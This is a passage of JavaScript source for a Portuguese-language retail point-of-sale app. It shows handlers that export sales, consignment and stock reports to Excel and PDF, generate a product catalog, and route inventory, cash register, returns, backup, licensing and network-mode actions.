  },
  'relatorios:rankingXlsx': (p) => {
    const r = relatorios.ranking(db, p || {});
    if (!r.ok) return r;
    const a2 = n => Math.round((Number(n) || 0) * 100) / 100;
    const wb = XLSX.utils.book_new();
    const add = (nome, rows, larguras) => {
      if (!rows || !rows.length) return;
      const ws = XLSX.utils.json_to_sheet(rows);
      ws['!cols'] = (larguras || Object.keys(rows[0]).map(k => Math.max(12, k.length + 3))).map(w => ({ wch: w }));
      XLSX.utils.book_append_sheet(wb, ws, nome);
    };
    const seta = (d) => d === null ? 'novo' : d > 0 ? `+${d}` : d < 0 ? String(d) : '=';
    for (const [chave, per] of Object.entries(r.periodos)) {
      add(({ dia: 'Hoje', semana: 'Semana', mes: 'Mes', ano: 'Ano' })[chave], per.produtos.map(x => ({
        'Posição': x.pos, 'Produto': x.nome, 'Referência': x.referencia,
        'Categoria': x.categoria, 'Peças': x.pecas, 'Receita': a2(x.receita),
        'Variação vs período anterior': seta(x.delta)
      })), [9, 34, 14, 20, 10, 14, 26]);
    }
    const ano = r.periodos.ano;
    add('Categorias', ano.categorias.map(c => ({
      'Categoria': c.categoria, 'Peças': c.pecas, 'Receita': a2(c.receita) })), [26, 10, 14]);
    add('Cor e tamanho', ano.variacoes.map(v => ({
      'Produto': v.produto, 'Cor': v.cor, 'Tamanho': v.tamanho,
      'Peças': v.pecas, 'Receita': a2(v.receita), 'Estoque atual': v.estoque })), [34, 14, 10, 10, 14, 14]);
    add('Clientes', ano.clientes.map(c => ({
      'Cliente': c.nome, 'Categoria': c.categoria, 'Compras': c.compras,
      'Total gasto': a2(c.gasto) })), [32, 20, 10, 14]);
    if (!wb.SheetNames.length) return { ok: false, erro: 'Nenhuma venda no período.' };
    return { ok: true, buffer: XLSX.write(wb, { type: 'base64', bookType: 'xlsx' }) };
  },
  'relatorios:eventoXlsx': (p) => {
    const o = p || {};
    const r = relatorios.relatorioEvento(db, o);
    if (!r.ok) return r;
    const s = o.secoes || {};
    const a2 = n => Math.round((Number(n) || 0) * 100) / 100;
    const wb = XLSX.utils.book_new();
    const add = (nome, rows, larguras) => {
      if (!rows || !rows.length) return;
      const ws = XLSX.utils.json_to_sheet(rows);
      ws['!cols'] = (larguras || Object.keys(rows[0]).map(k => Math.max(12, k.length + 3)))
        .map(w => ({ wch: w }));
      XLSX.utils.book_append_sheet(wb, ws, nome);
    };

    if (s.resumo !== false) {
      const q = r.resumo;
      add('Resumo', [
        { Indicador: 'Período', Valor: `${r.inicio} até ${r.fim}` },
        { Indicador: 'Vendas', Valor: q.vendas },
        { Indicador: 'Peças', Valor: q.pecas },
        { Indicador: 'Faturamento bruto', Valor: a2(q.bruto) },
        { Indicador: 'Devoluções', Valor: a2(q.devolucoes) },
        { Indicador: 'Faturamento líquido', Valor: a2(q.liquido) },
        { Indicador: 'Ticket médio', Valor: a2(q.ticket) },
        { Indicador: 'Taxas de cartão', Valor: a2(q.taxas) },
        { Indicador: 'Comissão consignado', Valor: a2(q.comissao) },
        { Indicador: 'Líquido a receber', Valor: a2(q.receber) },
        // Conciliação (v3.9.0): as mesmas linhas que fecham a lista de
        // produtos no faturamento bruto, para conferir na planilha.
        { Indicador: '', Valor: '' },
        { Indicador: 'Vendas do Salgueiro', Valor: a2(((q.origem || {}).proprio || {}).total || 0) },
        { Indicador: 'Vendas de consignados', Valor: a2(((q.origem || {}).consignado || {}).total || 0) },
        { Indicador: 'Total em descontos', Valor: a2((q.descontos || {}).valor || 0) },
        { Indicador: 'Total em cortesias', Valor: a2((q.cortesias || {}).valor || 0) },
        { Indicador: 'Valor de tabela das peças', Valor: a2((q.conciliacao || {}).tabela || 0) },
        { Indicador: '(–) Cortesias', Valor: a2((q.conciliacao || {}).cortesias || 0) },
        { Indicador: '(–) Descontos no fechamento', Valor: a2((q.conciliacao || {}).descontos || 0) },
        { Indicador: '= Faturamento bruto', Valor: a2(q.bruto) }
      ], [30, 26]);
    }
    if (s.vendas !== false) {
      add('Vendas', r.vendas.map(v => ({
        'Venda': v.id, 'Data': v.data, 'Hora': v.hora,
        'Cliente': v.cliente || '', 'Vendedor(a)': v.vendedor || '',
        'Peças': v.pecas, 'Subtotal': a2(v.subtotal), 'Desconto': a2(v.desconto),
        'Total': a2(v.total), 'Devolvido': a2(v.devolvido), 'Líquido': a2(v.liquido),
        'Taxa cartão': a2(v.taxa_valor), 'Comissão': a2(v.comissao),
        'Formas': v.pagamentos.map(g => g.rotulo).join(' + ')
      })), [8, 11, 7, 24, 18, 7, 12, 11, 12, 11, 12, 12, 12, 26]);
    }
    if (s.itens) {
      const linhas = [];
      for (const v of r.vendas) for (const it of v.itens) linhas.push({
        'Venda': v.id, 'Data': v.data, 'Hora': v.hora,
        'Produto': it.produto, 'Referência': it.referencia || '',
        'Cor': it.cor || '', 'Tamanho': it.tamanho || '',
        // Desconto do item MAIS a parte do desconto do fechamento que coube a
        // ele, e o que a cliente pagou por aquela peça (v3.14.0).
        'Qtd': it.qtd, 'Preço unit.': a2(it.preco_unit),
        'Valor de tabela': a2(it.tabela ?? it.total),
        'Desconto no item': a2(it.desconto || 0),
        'Desconto da venda': a2(it.desconto_venda || 0),
        'Desconto total': a2(it.desconto_total ?? it.desconto ?? 0),
        'Pagou': a2(it.recebido ?? it.total)
      });
      add('Itens', linhas, [8, 11, 7, 34, 14, 12, 10, 7, 12, 15, 15, 16, 14, 12]);
    }
    if (s.produtos !== false) {
      // Origem e percentual do fornecedor por peça (v3.11.0): é o que permite
      // conferir o acerto do consignado direto na planilha.
      add('Produtos vendidos', r.por_produto.map(x => ({
        'Produto': x.produto, 'Referência': x.referencia || '',
        'Cor': x.cor || '', 'Tamanho': x.tamanho || '',
        'Origem': x.consignado ? 'Consignado' : 'Salgueiro',
        'Fornecedor': x.consignado ? (x.fornecedor || '') : '',
        '% do fornecedor': x.consignado ? x.pct_fornecedor : '',
        'Qtd vendida': x.qtd,
        'Preço unit.': a2(x.qtd ? (x.tabela ?? x.total) / x.qtd : 0),
        'Valor de tabela': a2(x.tabela ?? x.total),
        'Desconto': a2(x.desconto || 0),
        'Recebido': a2(x.recebido ?? x.total)
      })), [34, 14, 12, 10, 13, 22, 16, 12, 12, 15, 12, 13]);
    }
    if (s.pagamentos !== false) {
      add('Pagamentos', r.por_forma.map(g => ({
        'Forma': g.forma, 'Qtd': g.qtd, 'Valor': a2(g.valor),
        'Taxa %': g.taxa_pct, 'Taxa R$': a2(g.taxa_valor),
        'Líquido': a2(g.valor - g.taxa_valor)
      })), [24, 8, 14, 10, 12, 14]);
    }
    if (s.consignado !== false && r.por_fornecedor.length) {
      // Custo e fatia do lucro discriminados (v3.8.0): o repasse é
      // custo + % do LUCRO, nunca % do preço de venda.
      add('Consignado', r.por_fornecedor.map(g => ({
        'Fornecedor': g.fornecedor, 'Peças': g.pecas,
        'Valor de tabela': a2(g.venda),
        'Desconto': a2(g.desconto || 0),
        'Recebido': a2(g.recebido ?? g.venda),
        'Custo das peças': a2(g.custo), 'Fatia do lucro': a2(g.lucro_fornecedor),
        'Repasse': a2(g.comissao),
        'Repasse dividindo o desconto': a2(g.comissao_ajustada ?? g.comissao),
        'Diferença': a2(g.dif_desconto || 0),
        'Sobra p/ a loja': a2(g.loja_real ?? g.parte_loja),
        'Pendente': a2(g.pendente)
      })), [30, 8, 15, 12, 13, 15, 15, 14, 26, 12, 15, 14]);
    }
    if (s.cortesias !== false && r.cortesias.length) {
      add('Cortesias', r.cortesias.map(x => ({
        'Venda': x.venda_id, 'Data': x.data, 'Hora': x.hora,
        'Produto': x.produtos || '', 'Para quem': x.beneficiario || '',
        'Autorizado por': x.autorizado_por || '', 'Peças': x.pecas,
        'Valor de tabela': a2(x.cortesia_valor), 'Custo p/ loja': a2(x.custo)
      })), [8, 11, 7, 34, 24, 22, 8, 15, 14]);
    }
    // Aba de descontos (v3.9.0): antes o Excel não trazia nenhuma — o valor
    // que separa o total das peças do faturamento não tinha onde ser conferido.
    if (s.descontos !== false && r.descontos && r.descontos.length) {
      add('Descontos', r.descontos.map(x => ({
        'Venda': x.venda_id, 'Data': x.data, 'Hora': x.hora,
        'Cliente': x.cliente || '', 'Quem lançou': x.operador || '',
        'Origem': x.origem, 'Autorizado por': x.autorizado_por || '',
        'Motivo': x.motivo || '', 'Valor de tabela': a2(x.subtotal),
        'Desconto': a2(x.desconto), '%': x.percent, 'Pago': a2(x.total)
      })), [8, 11, 7, 22, 18, 20, 20, 28, 15, 12, 7, 13]);
    }
    // Aba de vendas a preço de custo (v3.19.0). Mesma lógica da de descontos:
    // é margem que a loja abriu mão e precisa poder ser conferida fora do app.
    if (s.vendas_custo !== false && r.vendas_custo && r.vendas_custo.length) {
      add('Vendas a custo', r.vendas_custo.map(x => ({
        'Venda': x.venda_id, 'Data': x.data, 'Hora': x.hora,
        'Cliente': x.cliente || '', 'Quem lançou': x.operador || '',
        'Autorizado por': x.autorizado_por || '', 'Motivo': x.motivo || '',
        'Peças': x.pecas, 'Valor de tabela': a2(x.tabela),
        'Cobrado': a2(x.total), 'Margem aberta': a2(x.margem_aberta), '%': x.percent
      })), [8, 11, 7, 22, 18, 20, 28, 8, 15, 13, 15, 7]);
    }
    if (s.vendedor) {
      add('Vendedores', r.por_vendedor.map(g => ({
        'Vendedor(a)': g.vendedor, 'Vendas': g.qtd, 'Peças': g.pecas, 'Total': a2(g.total)
      })), [24, 10, 8, 14]);
    }
    if (s.categoria) {
      add('Categorias', r.por_categoria.map(c => ({
        'Categoria': c.categoria, 'Peças': c.pecas, 'Total': a2(c.total)
      })), [26, 8, 14]);
    }
    if (!wb.SheetNames.length) return { ok: false, erro: 'Selecione ao menos uma seção para exportar.' };
    return { ok: true, buffer: XLSX.write(wb, { type: 'base64', bookType: 'xlsx' }) };
  },

  // Lojas (unidades)
  // Locais de estoque
  'estoques:listar': (p) => estoques.listar(db, p || {}),
  'estoques:salvar': (p) => estoques.salvar(db, p || {}, sessao.usuario),
  'estoques:desativar': (p) => estoques.desativar(db, p.id, sessao.usuario),
  'estoques:conteudo': (p) => estoques.conteudo(db, p || {}),
  'estoques:variacoesNoLocal': (p) => estoques.variacoesNoLocal(db, p || {}),
  'estoques:porVariacao': (p) => ({ ok: true, locais: estoques.porVariacao(db, p.variacao_id) }),
  'estoques:mapaLocais': () => ({ ok: true, ...estoques.mapaLocais(db) }),
  'estoques:transferir': (p) => estoques.transferir(db, p || {}, sessao.usuario),
  'estoques:transferirTudo': (p) => estoques.transferirTudo(db, p || {}, sessao.usuario),
  'estoques:transferencias': (p) => estoques.listarTransferencias(db, p || {}),
  'estoques:romaneio': (p) => estoques.obterTransferencia(db, p.id),
  'estoques:conteudoXlsx': (p) => {
    const r = estoques.conteudo(db, p || {});
    if (!r.ok) return r;
    const a2 = n => Math.round((Number(n) || 0) * 100) / 100;
    // `conteudo` passou a devolver também as linhas zeradas (v3.25.39);
    // o balanço em Excel continua listando só o que tem saldo.
    const rows = r.itens.filter(i => i.qtd !== 0).map(i => ({
      'Produto': i.produto, 'Referência': i.referencia, 'Categoria': i.categoria,
      'Cor': i.cor, 'Tamanho': i.tamanho, 'Código de barras': i.codigo_barras,
      'Qtd neste estoque': i.qtd, 'Total do Salgueiro': i.total_geral,
      'Custo': a2(i.qtd * (i.preco_custo || 0)), 'Venda': a2(i.qtd * (i.preco_venda || 0)),
      'Conferido': ''
    }));
    if (!rows.length) return { ok: false, erro: 'Este estoque está vazio.' };
    const ws = XLSX.utils.json_to_sheet(rows);
    XLSX.utils.sheet_add_aoa(ws, [['TOTAL', '', '', '', '', '',
      r.totais.pecas, '', r.totais.custo, r.totais.venda, '']], { origin: `A${rows.length + 2}` });
    ws['!cols'] = [34, 14, 20, 14, 10, 18, 16, 16, 12, 12, 12].map(w => ({ wch: w }));
    const wb = XLSX.utils.book_new();
    XLSX.utils.book_append_sheet(wb, ws, 'Balanço');
    return { ok: true, buffer: XLSX.write(wb, { type: 'base64', bookType: 'xlsx' }) };
  },

  'estoques:romaneio-pdf': async (p) => {
    const r = estoques.obterTransferencia(db, p.id);
    if (!r.ok) return r;
    const cfg = config.obter(db).config;
    return await _gerarPdfBase64(gerarHtmlRomaneio(r, cfg));
  },
  'estoques:relatorio-transferencias-pdf': async (p) => {
    const r = estoques.listarTransferencias(db, { limite: 500 });
    if (!r.ok) return r;
    const cfg = config.obter(db).config;
    return await _gerarPdfBase64(gerarHtmlRelatorioTransferencias(r.transferencias, cfg, p || {}));
  },

  // Recibo de prestação de contas para um fornecedor consignado (v3.16.0)
  // Lista vendas de um fornecedor para o seletor do recibo (v3.22.0)
  'relatorios:listarVendasFornecedor': (p) => {
    const { fornecedor_id } = p || {};
    if (!fornecedor_id) return { ok: false, erro: 'fornecedor_id obrigatório' };
    const rows = db.prepare(`
      SELECT v.id, v.criado_em, COALESCE(c.nome, 'Consumidor final') cliente,
             SUM(cg.valor_venda) valor_tabela, COUNT(cg.id) pecas
      FROM consignacoes cg
      JOIN vendas v ON v.id = cg.venda_id
      LEFT JOIN clientes c ON c.id = v.cliente_id
      WHERE cg.fornecedor_id = ? AND v.status = 'concluida'
      GROUP BY v.id ORDER BY v.criado_em DESC LIMIT 300
    `).all(Number(fornecedor_id));
    return { ok: true, vendas: rows };
  },

  'relatorios:reciboConsignado': async (p) => {
    // Modos: 'evento' (de/ate), 'mes' (mes+ano), 'venda' (venda_ids[] ou venda_id)
    const { fornecedor_id, modo, de, ate, venda_id, venda_ids, mes, ano } = p || {};
    if (!fornecedor_id) return { ok: false, erro: 'Fornecedor não informado.' };

    const _dataBrLocal = s => s ? String(s).slice(0,10).split('-').reverse().join('/') : '—';
    let whereFiltro, arParams, periodoLabel;

    if (modo === 'venda') {
      const ids = Array.isArray(venda_ids) && venda_ids.length
        ? venda_ids.map(Number)
        : venda_id ? [Number(venda_id)] : [];
      if (!ids.length) return { ok: false, erro: 'Selecione ao menos uma venda.' };
      const ph = ids.map(() => '?').join(',');
      whereFiltro = `AND cg.venda_id IN (${ph})`;
      arParams = [fornecedor_id, ...ids];
      if (ids.length === 1) {
        const vRow = db.prepare('SELECT criado_em FROM vendas WHERE id=?').get(ids[0]);
        periodoLabel = `Venda #${ids[0]}${vRow ? ' — ' + _dataBrLocal(vRow.criado_em) : ''}`;
      } else {
        periodoLabel = `${ids.length} vendas selecionadas`;
      }
    } else if (modo === 'mes') {
      if (!mes || !ano) return { ok: false, erro: 'Mês e ano são obrigatórios.' };
      const mm = String(mes).padStart(2,'0');
      const ultimoDia = new Date(Number(ano), Number(mes), 0).getDate();
      const deM = `${ano}-${mm}-01 00:00`; const ateM = `${ano}-${mm}-${ultimoDia} 23:59`;
      whereFiltro = 'AND v.criado_em BETWEEN ? AND ?';
      arParams = [fornecedor_id, deM, ateM];
      const nomesMes = ['Janeiro','Fevereiro','Março','Abril','Maio','Junho',
                        'Julho','Agosto','Setembro','Outubro','Novembro','Dezembro'];
      periodoLabel = `${nomesMes[Number(mes)-1]} de ${ano}`;
    } else {
      // 'evento' (padrão) — usa de/ate
      if (!de || !ate) return { ok: false, erro: 'Informe o período do evento.' };
      // O input datetime-local envia "YYYY-MM-DDTHH:MM" (separador T).
      // O banco grava criado_em via datetime('now','localtime') → "YYYY-MM-DD HH:MM:SS" (espaço).
      // Comparação BETWEEN com T ≠ espaço no byte 10 quebra o filtro: vendas do dia
      // do evento ficam abaixo do limite inferior e vendas do dia seguinte entram
      // indevidamente. Normaliza exatamente como relatorioEvento faz com limpa() (v3.24.0).
      const _limpa = s => String(s || '').replace('T', ' ').slice(0, 16);
      const deNorm  = _limpa(de)  + ':00';
      const ateNorm = _limpa(ate) + ':59';
      whereFiltro = 'AND v.criado_em BETWEEN ? AND ?';
      arParams = [fornecedor_id, deNorm, ateNorm];
      periodoLabel = null; // gerarHtmlReciboConsignado usa de/ate diretamente
    }

    const itens = db.prepare(`
      SELECT pr.nome produto, va.cor, va.tamanho, pr.preco_venda,
             cg.qtd, cg.valor_venda, cg.valor_custo,
             cg.pct_fornecedor, cg.valor_fornecedor, cg.valor_loja, cg.status,
             v.id venda_id, v.criado_em venda_data,
             v.subtotal venda_subtotal, v.total venda_total,
             f.nome fornecedor, f.id fornecedor_id
      FROM consignacoes cg
      JOIN vendas v    ON v.id   = cg.venda_id
      JOIN fornecedores f ON f.id = cg.fornecedor_id
      JOIN produtos pr ON pr.id  = cg.produto_id
      LEFT JOIN variacoes va ON va.produto_id = pr.id AND va.id = (
        SELECT vi.variacao_id FROM venda_itens vi
        JOIN variacoes v2 ON v2.id = vi.variacao_id
        WHERE vi.venda_id = cg.venda_id AND v2.produto_id = pr.id LIMIT 1
      )
      WHERE cg.fornecedor_id = ? AND v.status = 'concluida'
        ${whereFiltro}
      ORDER BY v.criado_em, pr.nome, va.cor, va.tamanho
    `).all(...arParams);

    if (!itens.length) return { ok: false, erro: 'Nenhum item de consignado encontrado para este fornecedor no período informado.' };

    const cfg = config.obter(db).config || {};
    try {
      const buf = await Neutralino.filesystem.readBinaryFile(`${NL_PATH}/src/img/logo-etq.jpeg`);
      const bytes = new Uint8Array(buf); let bin = ''; const CHUNK = 8192;
      for (let i = 0; i < bytes.length; i += CHUNK) bin += String.fromCharCode(...bytes.subarray(i, Math.min(i+CHUNK, bytes.length)));
      cfg._logoUri = `data:image/jpeg;base64,${btoa(bin)}`;
    } catch { cfg._logoUri = ''; }

    const html = gerarHtmlReciboConsignado(itens, cfg, { de, ate, label: periodoLabel, modo: modo || 'evento' });
    return await _gerarPdfBase64(html);
  },

  // ── Catálogo de Produtos (v3.17.0) ────────────────────────────────────────
  'catalogo:categorias': () => {
    const rows = db.prepare(`
      SELECT c.id, c.nome, COUNT(p.id) total
      FROM categorias c
      JOIN produtos p ON p.categoria_id = c.id AND p.ativo = 1
      GROUP BY c.id, c.nome
      HAVING total > 0
      ORDER BY c.nome
    `).all();
    const semCat = db.prepare(
      "SELECT COUNT(*) total FROM produtos WHERE ativo=1 AND (categoria_id IS NULL OR categoria_id NOT IN (SELECT id FROM categorias))"
    ).get();
    if ((semCat.total || 0) > 0) rows.push({ id: null, nome: 'Sem categoria', total: semCat.total });
    return { ok: true, categorias: rows };
  },

  'catalogo:gerar': async (p) => {
    const { titulo, colecao, categorias, soEstoque, mostrarPreco, mostrarRef, mostrarQr } = p || {};
    const todasCats = !Array.isArray(categorias) || categorias.length === 0;
    const catIds = todasCats ? [] : categorias.filter(c => c !== null).map(Number);
    const incluiSemCat = todasCats || categorias.includes(null);

    const filtroEst  = soEstoque
      ? 'AND EXISTS (SELECT 1 FROM variacoes v2 WHERE v2.produto_id=p.id AND v2.ativo=1 AND v2.estoque>0)'
      : '';
    const filtroCat = todasCats ? '' : catIds.length
      ? `AND (p.categoria_id IN (${catIds.map(() => '?').join(',')})${incluiSemCat ? ' OR p.categoria_id IS NULL' : ''})`
      : (incluiSemCat ? 'AND p.categoria_id IS NULL' : 'AND 1=0');

    const rows = db.prepare(`
      SELECT p.id, p.nome, p.referencia, p.foto foto_prod, p.preco_venda,
             COALESCE(c.nome,'Sem categoria') categoria, c.id categoria_id,
             va.cor, va.tamanho, va.estoque, va.codigo_barras, va.foto foto_var
      FROM produtos p
      LEFT JOIN categorias c ON c.id = p.categoria_id
      LEFT JOIN variacoes va ON va.produto_id = p.id AND va.ativo = 1
      WHERE p.ativo = 1 ${filtroEst} ${filtroCat}
      ORDER BY COALESCE(c.nome,'Sem categoria'), p.nome, va.cor, va.tamanho
    `).all(...(todasCats ? [] : catIds.length ? catIds : []));

    if (!rows.length) return { ok: false, erro: 'Nenhum produto encontrado com os filtros escolhidos.' };

    // Agrega variantes por produto
    const prodMap = new Map();
    for (const row of rows) {
      if (!prodMap.has(row.id)) {
        prodMap.set(row.id, {
          id: row.id, nome: row.nome, referencia: row.referencia,
          foto: row.foto_prod, preco_venda: row.preco_venda,
          categoria: row.categoria, categoria_id: row.categoria_id,
          cores: [], tamanhos: [], codigo_barras: null
        });
      }
      const prod = prodMap.get(row.id);
      if (row.cor  && row.cor  !== 'Única' && !prod.cores.includes(row.cor))    prod.cores.push(row.cor);
      if (row.tamanho && row.tamanho !== 'U' && !prod.tamanhos.includes(row.tamanho)) prod.tamanhos.push(row.tamanho);
      if (row.codigo_barras && !prod.codigo_barras) prod.codigo_barras = row.codigo_barras;
      if (!prod.foto && row.foto_var) prod.foto = row.foto_var;
    }

    // Fotos no catálogo (v3.25.31): o Chromium headless que gera este PDF RECUSA
    // data URI GRANDE em <img> — por isso o catálogo saía sem as fotos das peças
    // (só o logo, que é pequeno, aparecia). Solução robusta: gravar cada foto
    // como ARQUIVO na MESMA pasta do HTML (tmp-print) e referenciar por caminho
    // RELATIVO. O file:// no mesmo diretório carrega imagem de qualquer tamanho.
    const _appDirCat = (typeof NL_PATH !== 'undefined' ? NL_PATH : (typeof NL_CWD !== 'undefined' ? NL_CWD : '')).replace(/\\/g, '/');
    const _tmpDirCat = _appDirCat + '/tmp-print';
    try { await Neutralino.filesystem.createDirectory(_tmpDirCat); } catch {}
    const _fotosCatArqs = [];
    let _fIdx = 0;
    for (const prod of prodMap.values()) {
      if (!prod.foto) continue;
      try {
        const dataUri = await ambiente.lerFotoArquivo(prod.foto);
        const m = /^data:image\/([a-z0-9.+-]+);base64,(.*)$/i.exec(dataUri || '');
        if (!m) { prod.foto = null; continue; }
        const ext = (m[1].toLowerCase() === 'jpeg' ? 'jpg' : m[1].toLowerCase()).replace(/[^a-z0-9]/g, '') || 'jpg';
        const bin = atob(m[2]);
        const bytes = new Uint8Array(bin.length);
        for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
        const nomeArq = `catimg-${Date.now()}-${_fIdx++}.${ext}`;
        await Neutralino.filesystem.writeBinaryFile(`${_tmpDirCat}/${nomeArq}`, bytes.buffer);
        _fotosCatArqs.push(`${_tmpDirCat}/${nomeArq}`);
        prod.foto = nomeArq;   // caminho relativo ao HTML (mesma pasta tmp-print)
      } catch { prod.foto = null; }
    }

    // Agrupa por categoria
    const catMap = new Map();
    for (const prod of prodMap.values()) {
      if (!catMap.has(prod.categoria)) catMap.set(prod.categoria, []);
      catMap.get(prod.categoria).push(prod);
    }
    const cats = [...catMap.entries()].map(([nome, produtos]) => ({ nome, produtos }));

    // Logo
    const cfg = config.obter(db).config || {};
    try {
      const buf = await Neutralino.filesystem.readBinaryFile(`${NL_PATH}/src/img/logo-etq.jpeg`);
      const bytes = new Uint8Array(buf); let bin = ''; const CHUNK = 8192;
      for (let i = 0; i < bytes.length; i += CHUNK)
        bin += String.fromCharCode(...bytes.subarray(i, Math.min(i + CHUNK, bytes.length)));
      cfg._logoUri = `data:image/jpeg;base64,${btoa(bin)}`;
    } catch { cfg._logoUri = cfg.logo_cupom || cfg.logo || ''; }

    const html = gerarHtmlCatalogo(cats, cfg, { titulo, colecao, mostrarPreco, mostrarRef, mostrarQr });
    const _resCat = await _gerarPdfBase64(html);
    // limpa as imagens temporárias do catálogo (o HTML/PDF o próprio gerador apaga)
    for (const arq of _fotosCatArqs) { try { await Neutralino.filesystem.remove(arq); } catch {} }
    return _resCat;
  },

  'lojas:listar': (p) => lojas.listar(db, p || {}),
  'lojas:salvar': (p) => lojas.salvar(db, p, sessao.usuario),
  'lojas:excluir': (p) => lojas.excluir(db, p.id, sessao.usuario),

  // Financeiro
  'financeiro:listar': (p) => financeiro.listar(db, p || {}),
  'financeiro:salvar': (p) => financeiro.salvar(db, p, sessao.usuario),
  'financeiro:baixar': (p) => financeiro.baixar(db, p, sessao.usuario),
  'financeiro:excluir': (p) => financeiro.excluir(db, p.id, sessao.usuario),
  'financeiro:fluxo': (p) => financeiro.fluxo(db, p || {}),

  // PDV / Caixa
  'pdv:caixaAtual': () => pdv.caixaAtual(db),
  'pdv:abrirCaixa': (p) => pdv.abrirCaixa(db, p, sessao.usuario),
  'pdv:movimentoCaixa': (p) => pdv.movimentoCaixa(db, p, sessao.usuario),
  'pdv:resumoCaixa': (p) => pdv.resumoCaixa(db, p.caixa_id),
  'pdv:fecharCaixa': async (p) => {
    const r = await pdv.fecharCaixa(db, p, sessao.usuario);
    if (r.ok) nuvem.fazerBackupTodos(db).catch(() => {}); // fire-and-forget
    return r;
  },
  'pdv:venda': (p) => pdv.registrarVenda(db, p, sessao.usuario),
  'pdv:obterVenda': (p) => pdv.obterVenda(db, p.id),
  'pdv:listarVendas': (p) => pdv.listarVendas(db, p || {}),
  'pdv:listarVendasGeral': (p) => pdv.listarVendasGeral(db, p || {}),
  'pdv:cancelarVenda': (p) => pdv.cancelarVenda(db, p, sessao.usuario),

  // Devoluções
  'devolucoes:itensVenda': (p) => devolucoes.itensVenda(db, p.venda_id),
  'devolucoes:registrar': (p) => devolucoes.registrar(db, p, sessao.usuario),
  'devolucoes:listar': () => devolucoes.listar(db),

  // Vales-troca
  'vales_troca:consultar': (p) => valesTroca.consultar(db, p.codigo),
  'vales_troca:listar': () => valesTroca.listar(db),

  // Trocas (devolução + nova venda em transação única)
  'trocas:registrarRapida': (p) => trocas.registrarRapida(db, p || {}, sessao.usuario),
  'vendas:importarAnalisar': (p) => importarVendas.analisar(db, p || {}),
  'vendas:importarConfirmar': (p) => importarVendas.confirmar(db, p || {}, sessao.usuario),
  'trocas:registrar': (p) => trocas.registrar(db, p, sessao.usuario),

  // Backup na nuvem — Google Drive e OneDrive (OAuth 2.0 PKCE)
  'nuvem:status': () => nuvem.obterStatus(),
  'nuvem:salvarClientId': (p) => nuvem.salvarClientId(p.provider, p.client_id),
  'nuvem:conectar': (p) => nuvem.iniciarOAuth(p.provider),
  'nuvem:desconectar': (p) => nuvem.desconectar(p.provider),
  'nuvem:backup': (p) => nuvem.fazerBackup(db, p.provider),

  // Atualizador automático via GitHub Releases
  'updater:verificar': (p) => updater.verificarAtualizacao(p.versaoAtual || '0.0.0'),

  // Programa de pontos
  'pontos:config': () => pontos.getConfig(db),
  'pontos:salvarConfig': (p) => pontos.salvarConfig(db, p, sessao.usuario),
  'pontos:saldo': (p) => pontos.saldo(db, p.cliente_id),
  'pontos:historico': (p) => pontos.historico(db, p.cliente_id),
  'pontos:ajustar': (p) => pontos.ajustar(db, p, sessao.usuario),

  // Consignação
  'consignacao:resumo': () => consignacao.resumo(db),
  'consignacao:listar': (p) => consignacao.listar(db, p),
  'consignacao:acertar': (p) => consignacao.acertar(db, p, sessao.usuario),

  // Licença (arrendamento) e área do desenvolvedor
  'licenca:status': () => ({ ok: true, ...licenca.estado() }),
  'licenca:renovar': (p) => licenca.renovar(p.codigo),
  'dev:entrar': (p) => licenca.devEntrar(p.usuario, p.senha),
  'dev:aplicar': (p) => licenca.devAplicar(p),
  'dev:remover': (p) => licenca.devRemover(p.senha),
  'dev:trocarSenha': (p) => licenca.devTrocarSenha(p.senha_atual, p.nova_senha),
  'dev:setores': (p) => licenca.devSetores(p.senha, p.bloqueados),
  'dev:resetarFabrica': async (p) => {
    if (!licenca.senhaDevOk(p.senha)) return { ok: false, erro: 'Senha de desenvolvedor incorreta.' };
    if (String(p.confirmacao || '').trim().toUpperCase() !== 'ZERAR') {
      return { ok: false, erro: 'Confirmação inválida.' };
    }
    // Backup de segurança do banco antes de zerar (fica na pasta de dados)
    try {
      const carimbo = new Date().toISOString().replace(/[:.]/g, '-');
      await db.salvarAgora();
      await ambiente.copiarBancoPara(`${await ambiente.dirDados()}/backup-antes-reset-${carimbo}.db`, db.exportar());
    } catch (e) { console.error('backup pré-reset falhou:', e); }
    await resetarDados(db);
    sessao.usuario = null;
    return { ok: true };
  },

  // Acesso em rede (multiterminal)
  'rede:status': () => {
    const cfg = config.obter(db).config;
    return { ok: true, ...rede.status(cfg.rede_porta), ativa_config: cfg.rede_ativa === '1' };
  },
  'rede:abrirNavegador': async (p) => {
    const url = String(p.url || '');
    // só endereços http locais gerados pela própria aba Rede
    if (!/^http:\/\/[0-9.]+:\d{2,5}\/?$/.test(url)) return { ok: false, erro: 'Endereço inválido.' };
    await Neutralino.os.open(url);
    return { ok: true };
  },
  'rede:aplicar': async (p) => {
    if (p.ativa && !licenca.moduloAtivo('rede')) {
      return { ok: false, erro: 'O módulo "Acesso em Rede" não está incluído no seu plano.' };
    }
    const porta = Number(p.porta) || 8750;
    const r = config.salvar(db, { rede_ativa: p.ativa ? '1' : '0', rede_porta: String(porta) }, sessao.usuario);
    if (!r.ok) return r;
    await rede.parar();
    if (!p.ativa) return { ok: true, ativa: false };
    const ini = await rede.iniciar({ porta });
    return ini.ok ? { ok: true, ativa: true, porta, ips: ini.ips } : ini;
  }
};


// ── Catálogo de Produtos — gerador de HTML ────────────────────────────────────
function gerarHtmlCatalogo(cats, cfg, opts = {}) {
  const { titulo = 'Catálogo de Produtos', colecao = '', mostrarPreco = true, mostrarRef = true, mostrarQr = true } = opts;
  const esc = s => String(s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  const R       = cfg.cor_primaria || '#B01E23';
  const R_DK    = '#7a1219';
  const loja    = esc(cfg.loja_nome || 'Boutique');
  const sub     = esc(cfg.loja_subtitulo || '');
  const tel     = esc(cfg.loja_telefone || '');
  const end_    = esc(cfg.loja_endereco || '');
  const logoUri = cfg._logoUri || '';
  const dataHoje = new Date().toLocaleDateString('pt-BR', { day: '2-digit', month: 'long', year: 'numeric' });

  // Mapa de cores conhecidas → hex CSS
  const COR_MAP = {
    branco:'#ffffff', preto:'#1a1a1a', vermelho:'#c0392b', azul:'#2980b9',
    verde:'#27ae60', amarelo:'#f1c40f', laranja:'#e67e22', rosa:'#e91e63',
    roxo:'#9b59b6', cinza:'#95a5a6', marrom:'#795548', bege:'#e8dcc8',
    vinho:'#7b1c2c', caramelo:'#c67c2f', nude:'#d4a688', off:'#f0ebe3',
